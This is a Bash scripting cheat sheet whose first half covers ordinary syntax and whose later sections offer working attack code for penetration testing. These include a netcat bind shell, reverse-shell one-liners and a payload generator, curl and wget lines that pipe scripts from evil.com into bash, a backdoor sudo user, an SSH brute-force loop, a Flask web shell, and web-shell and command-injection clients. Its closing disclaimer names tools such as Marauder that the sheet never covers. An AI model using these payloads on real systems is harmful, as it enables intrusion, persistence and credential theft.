# Bash Scripting Cheat Sheet

## Basic Execution

```bash
#!/bin/bash                          # Shebang
bash script.sh                       # Execute script
chmod +x script.sh                   # Make executable
./script.sh                          # Run standalone
```

---

## Loops

### IF-ELSE-IF Statement
```bash
#!/bin/bash
USER_INPUT="${1}"

if [[ -z "${USER_INPUT}" ]]; then
    echo "You must provide an argument!"
    exit 1
fi

if [[ -f "${USER_INPUT}" ]]; then
    echo "${USER_INPUT} is a file."
elif [[ -d "${USER_INPUT}" ]]; then
    echo "${USER_INPUT} is a directory."
else
    echo "${USER_INPUT} is not a file or directory."
fi
```

### Until Loop
```bash
#!/bin/bash
FILE="output.txt"

touch "${FILE}"
until [[ -s "${FILE}" ]]; do
    echo "${FILE} is empty..."
    sleep 2
done

echo "${FILE} has content!"
```

### While Loop
```bash
#!/bin/bash
SIGNAL_FILE="stoploop"

while [[ ! -f "${SIGNAL_FILE}" ]]; do
    echo "Waiting for ${SIGNAL_FILE}..."
    sleep 2
done

echo "File found! Exiting..."
```

### For Loop
```bash
# Range
for i in {1..10}; do
    echo "$i"
done

# Array iteration
for item in "${array[@]}"; do
    echo "$item"
done

# Files
for file in /path/*.txt; do
    echo "$file"
done
```

---

## User Input & Output

### Basic Input
```bash
#!/bin/bash

echo "What is your first name?"
read -r firstname

echo "What is your last name?"
read -r lastname

echo "Your name is ${firstname} ${lastname}"
```

### Silent Input (passwords)
```bash
read -sp "Enter password: " password
echo
```

### Prompt with Default
```bash
read -rp "Host [localhost]: " host
host=${host:-localhost}
```

---

## Variables

### Variable Assignment
```bash
VAR="value"
VAR="${1}"                           # From argument
VAR=$(command)                       # Command output
VAR="$(<file.txt)"                   # File content
```

### Local vs Global
```bash
#!/bin/bash

GLOBAL_VAR="accessible everywhere"

my_function() {
    local LOCAL_VAR="only in function"
    echo "${LOCAL_VAR}"
    echo "${GLOBAL_VAR}"
}

my_function
echo "${GLOBAL_VAR}"                 # Works
echo "${LOCAL_VAR}"                  # Empty
```

### Special Variables
```bash
$0                                   # Script name
$1, $2, $3                           # Positional arguments
$#                                   # Number of arguments
$@                                   # All arguments
$?                                   # Exit status of last command
$$                                   # Process ID
$!                                   # PID of last background job
```

---

## Comparisons

### Integer Comparison
```bash
if [[ "${VAR1}" -eq "${VAR2}" ]]; then    # Equal
if [[ "${VAR1}" -ne "${VAR2}" ]]; then    # Not equal
if [[ "${VAR1}" -gt "${VAR2}" ]]; then    # Greater than
if [[ "${VAR1}" -lt "${VAR2}" ]]; then    # Less than
if [[ "${VAR1}" -ge "${VAR2}" ]]; then    # Greater/equal
if [[ "${VAR1}" -le "${VAR2}" ]]; then    # Less/equal
```

### String Comparison
```bash
if [[ "${STR1}" == "${STR2}" ]]; then     # Equal
if [[ "${STR1}" != "${STR2}" ]]; then     # Not equal
if [[ -z "${STR}" ]]; then                # Empty string
if [[ -n "${STR}" ]]; then                # Not empty
if [[ "${STR}" =~ pattern ]]; then        # Regex match
```

### File Tests
```bash
if [[ -f "${FILE}" ]]; then               # File exists
if [[ -d "${DIR}" ]]; then                # Directory exists
if [[ -r "${FILE}" ]]; then               # Readable
if [[ -w "${FILE}" ]]; then               # Writable
if [[ -x "${FILE}" ]]; then               # Executable
if [[ -s "${FILE}" ]]; then               # File not empty
if [[ -L "${FILE}" ]]; then               # Symbolic link
```

---

## File Operations

### File Search
```bash
# Check if file exists
if [[ -f "${FILENAME}" ]]; then
    echo "${FILENAME} exists."
    exit 1
else
    touch "${FILENAME}"
fi
```

### Recursive File Search & Backup
```bash
#!/bin/bash
DIR_SEARCH="${1:-/var/log}"
DIR_BACKUP="${HOME}/backup"
COMPRESSED_FILE="${HOME}/files.tar.gz"

# Check if search directory exists
if [[ ! -d "${DIR_SEARCH}" ]]; then
    echo "${DIR_SEARCH} is not a directory."
    exit 1
fi

# Create backup directory
[[ ! -d "${DIR_BACKUP}" ]] && mkdir "${DIR_BACKUP}"

# Copy readable files
while read -r file; do 
    echo "Copying ${file} to ${DIR_BACKUP}"
    cp -f "${file}" "${DIR_BACKUP}"
done < <(find "${DIR_SEARCH}" -type f -readable 2>/dev/null)

# Compress if backup has files
if [[ -n $(ls -A "${DIR_BACKUP}") ]]; then
    echo "Compressing files..."
    tar czvfP "${COMPRESSED_FILE}" "${DIR_BACKUP}"
    echo "Compressed to ${COMPRESSED_FILE}"
else
    echo "${DIR_BACKUP} is empty."
fi

rm -rf "${DIR_BACKUP}"
```

### File Operations
```bash
cat file.txt                         # Display contents
head -n 10 file.txt                  # First 10 lines
tail -n 10 file.txt                  # Last 10 lines
tail -f file.txt                     # Follow file (live)

cp source dest                       # Copy
mv old new                           # Move/rename
rm file                              # Delete
rm -rf directory                     # Delete directory recursively

touch file.txt                       # Create empty file
echo "text" > file.txt               # Overwrite
echo "text" >> file.txt              # Append
```

---

## Functions

### Basic Function
```bash
my_function() {
    echo "Hello from function"
    echo "Arg 1: $1"
    echo "Arg 2: $2"
    return 0
}

my_function "first" "second"
```

### Function with Return Value
```bash
get_value() {
    echo "return_value"
}

result=$(get_value)
echo "${result}"
```

---

## Text Processing

### grep - Search Text
```bash
grep "pattern" file.txt              # Search for pattern
grep -i "pattern" file.txt           # Case-insensitive
grep -r "pattern" /path              # Recursive
grep -v "pattern" file.txt           # Invert match
grep -E "regex" file.txt             # Extended regex
```

### sed - Stream Editor
```bash
sed 's/old/new/' file.txt            # Replace first occurrence
sed 's/old/new/g' file.txt           # Replace all
sed -i 's/old/new/g' file.txt        # Edit in-place
sed -n '5,10p' file.txt              # Print lines 5-10
```

### awk - Text Processing
```bash
awk '{print $1}' file.txt            # Print first column
awk -F: '{print $1}' /etc/passwd     # Custom delimiter
awk '/pattern/ {print $0}' file.txt  # Pattern matching
```

### cut - Column Extraction
```bash
cut -d: -f1 /etc/passwd              # First field, colon delimiter
cut -c1-10 file.txt                  # Characters 1-10
```

---

## Network Operations

### cURL
```bash
curl http://example.com                           # GET request
curl -o file.html http://example.com              # Save to file
curl -s http://example.com                        # Silent mode
curl -w "%{http_code}" http://example.com         # Show HTTP code
curl -X POST -d "data=value" http://example.com   # POST request
curl -H "Header: value" http://example.com        # Custom header
curl -u user:pass http://example.com              # Basic auth
```

### wget
```bash
wget http://example.com/file.txt                  # Download file
wget -O output.txt http://example.com/file.txt    # Save as
wget -r http://example.com                        # Recursive download
wget --spider http://example.com                  # Check if exists
```

### netcat (nc)
```bash
nc -lvnp 4444                        # Listen on port 4444
nc 192.168.1.100 4444                # Connect to target
nc -lvnp 4444 -e /bin/bash           # Bind shell
echo "data" | nc 192.168.1.100 80    # Send data
```

### Network Info
```bash
ip addr show                         # Show IP addresses
ip route                             # Show routing table
ss -tulpn                            # Show listening ports
netstat -tulpn                       # Alternative
ping -c 4 192.168.1.1                # Ping 4 times
```

---

## Process Management

```bash
ps aux                               # List all processes
ps aux | grep process_name           # Find process
kill PID                             # Terminate process
kill -9 PID                          # Force kill
killall process_name                 # Kill by name

command &                            # Run in background
jobs                                 # List background jobs
fg %1                                # Bring job 1 to foreground
bg %1                                # Resume job 1 in background

nohup command &                      # Run immune to hangups
```

---

## System Information

```bash
whoami                               # Current user
id                                   # User/group IDs
hostname                             # System hostname
uname -a                             # System information
cat /etc/os-release                  # OS info

df -h                                # Disk usage
du -sh /path                         # Directory size
free -h                              # Memory usage
uptime                               # System uptime

which command                        # Locate binary
whereis command                      # Locate binary/man page
```

---

## Pen Testing Patterns

### Port Scanning
```bash
#!/bin/bash
host="${1}"

for port in {1..1024}; do
    timeout 1 bash -c "echo >/dev/tcp/${host}/${port}" 2>/dev/null && \
        echo "Port ${port} is open"
done
```

### Simple Reverse Shell Listener
```bash
#!/bin/bash
port="${1:-4444}"

echo "[*] Listening on port ${port}..."
while true; do
    nc -lvnp "${port}"
    echo "[*] Connection closed. Listening again..."
done
```

### Brute Force Template
```bash
#!/bin/bash
target="${1}"
userlist="${2}"
passlist="${3}"

while IFS= read -r user; do
    while IFS= read -r pass; do
        # Attempt authentication
        result=$(sshpass -p "${pass}" ssh -o StrictHostKeyChecking=no \
                 "${user}@${target}" "echo success" 2>&1)
        
        if [[ "${result}" == "success" ]]; then
            echo "[+] Valid credentials: ${user}:${pass}"
            exit 0
        fi
    done < "${passlist}"
done < "${userlist}"
```

### Payload Generation
```bash
#!/bin/bash
lhost="${1}"
lport="${2}"

# Generate reverse shell payload
cat << EOF > shell.sh
#!/bin/bash
bash -i >& /dev/tcp/${lhost}/${lport} 0>&1
EOF

chmod +x shell.sh
echo "[+] Payload created: shell.sh"
```

---

## Web Shell Scripts

### Python Web Shell Injection
```python
import os, subprocess
from flask import Flask, render_template, request, send_file

def execute(cmd):
    return os.popen(cmd).read()

app = Flask(__name__)
app.debug = True
app.config['UPLOAD_FOLDER'] = "uploads/"
app.jinja_env.globals.update(execute=execute)

@app.route('/')
def hello_world():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    allowed_types = ['image/jpeg', 'image/png', 'image/gif']
    f = request.files['file']
    
    if f.content_type not in allowed_types:
        return 'File type not allowed!'
    
    f.save(os.path.join(app.config['UPLOAD_FOLDER'], f.filename))
    return 'Upload successful!'

# Malicious web shell
@app.route('/webshell/<command>')
def webshell(command):
    result = subprocess.check_output(command, shell=True)
    return result.decode('utf-8')
```

### Python Web Shell Checker
```python
import subprocess

# Test web shell
result = subprocess.check_output('id', shell=True)
print(result.decode('utf-8'))
```

### Bash Web Shell Client
```bash
#!/bin/bash

read -rp 'Host: ' host
read -rp 'Port: ' port

while true; do
    read -rp '$ ' raw_command
    command=$(printf %s "${raw_command}" | jq -sRr @uri)
    
    response=$(curl -s -w "%{http_code}" -o /dev/null \
               "http://${host}:${port}/webshell/${command}")
    http_code=$(tail -n1 <<< "$response")

    if [[ "${http_code}" =~ ^[0-9]+$ ]]; then
        if [[ "${http_code}" -eq 200 ]]; then
            curl "http://${host}:${port}/webshell/${command}"
        else
            echo "Error: HTTP ${http_code}"
        fi
    else
        echo "Error: Invalid HTTP status"
    fi
done
```

### OS Command Injection Client
```bash
#!/bin/bash

read -rp 'Host: ' host
read -rp 'Port: ' port

while true; do
    read -rp '$ ' raw_command
    command=$(printf %s "${raw_command}" | jq -sRr @uri)

    # Get previous output
    prev_resp=$(curl -s "http://${host}:${port}/amount_to_donate.txt")

    # Execute injection
    curl -s -o /dev/null "http://${host}:${port}/donate.php?amount=1|${command}"
    
    # Get new output
    new_resp=$(curl -s "http://${host}:${port}/amount_to_donate.txt")
    
    # Extract difference
    delta=$(diff --new-line-format="%L" \
                 --unchanged-line-format="" \
                 <(echo "${prev_resp}") <(echo "${new_resp}"))

    echo "${delta}"
done
```

---

## Error Handling

```bash
# Exit on error
set -e

# Exit on undefined variable
set -u

# Exit on pipe failure
set -o pipefail

# Combine all
set -euo pipefail

# Trap errors
trap 'echo "Error on line $LINENO"' ERR

# Check command success
if command; then
    echo "Success"
else
    echo "Failed"
fi

# Redirect errors
command 2>/dev/null              # Discard errors
command 2>&1                     # Combine stdout/stderr
command > output.txt 2>&1        # Redirect both to file
```

---

## Arrays

```bash
# Define array
arr=("item1" "item2" "item3")

# Access elements
echo "${arr[0]}"                 # First element
echo "${arr[@]}"                 # All elements
echo "${#arr[@]}"                # Array length

# Add element
arr+=("item4")

# Loop through array
for item in "${arr[@]}"; do
    echo "${item}"
done

# Read file into array
mapfile -t lines < file.txt
```

---

## String Manipulation

```bash
# Length
${#string}

# Substring
${string:position:length}

# Replace
${string/pattern/replacement}      # First occurrence
${string//pattern/replacement}     # All occurrences

# Remove prefix/suffix
${string#pattern}                  # Remove shortest match from start
${string##pattern}                 # Remove longest match from start
${string%pattern}                  # Remove shortest match from end
${string%%pattern}                 # Remove longest match from end

# Case conversion
${string^^}                        # Uppercase
${string,,}                        # Lowercase
```

---

## One-Liners

```bash
# Find SUID files
find / -perm -4000 -type f 2>/dev/null

# Find writable directories
find / -writable -type d 2>/dev/null

# Find files modified in last 7 days
find /path -type f -mtime -7

# Check if port is open
timeout 1 bash -c "echo >/dev/tcp/192.168.1.1/80" && echo "Open"

# Extract IPs from file
grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' file.txt

# Generate wordlist
for i in {0000..9999}; do echo "$i"; done > wordlist.txt

# Base64 encode/decode
echo "text" | base64
echo "dGV4dAo=" | base64 -d

# URL encode
printf '%s' "text with spaces" | jq -sRr @uri

# Download and execute
curl -s http://evil.com/script.sh | bash
wget -qO- http://evil.com/script.sh | bash

# Reverse shell
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

# Create backdoor user
useradd -m -s /bin/bash -G sudo backdoor
echo "backdoor:password" | chpasswd
```

---

## Useful Tools

```bash
# Encode/Decode
base64                               # Base64 encoding
xxd                                  # Hex dump
md5sum / sha256sum                   # Hash files

# Network
nmap                                 # Network scanner
netcat / nc                          # Swiss army knife
socat                                # Advanced netcat
tcpdump                              # Packet capture
wireshark / tshark                   # Packet analysis

# Web
curl / wget                          # HTTP clients
nikto                                # Web scanner
dirb / gobuster                      # Directory brute force
sqlmap                               # SQL injection

# Password
hydra                                # Brute force tool
john                                 # Password cracker
hashcat                              # Hash cracker

# Enumeration
enum4linux                           # SMB enumeration
smbclient                            # SMB client
ldapsearch                           # LDAP queries
```

---

## Quick Tips

- Use `"${variable}"` to prevent word splitting
- Use `[[` instead of `[` for better syntax
- Always quote variables: `"${var}"`
- Use `$()` instead of backticks for command substitution
- Test scripts with `bash -x script.sh` for debugging
- Use `shellcheck` to validate scripts
- Redirect errors to null: `2>/dev/null`
- Use `timeout` to prevent hanging commands
- Log everything: `script.sh 2>&1 | tee output.log`

---

## Security and Ethical Considerations ⚠️

**IMPORTANT**: These tools are for **authorized security testing only**. Unauthorized use is illegal.

* **Marauder Use:** Get **written permission** before testing any network. Only test networks you own or have explicit authorization to test.
* **Cracking Use:** All cracking attempts (Hashcat) must be done in an **isolated lab environment** against hashes you are authorized to possess.
* **Legal Compliance:** Strictly comply with all local laws and regulations.

**Legal Use Cases:**
* Penetration testing with client authorization.
* Testing your own home or lab network security.
* Security research in isolated lab environments.

---
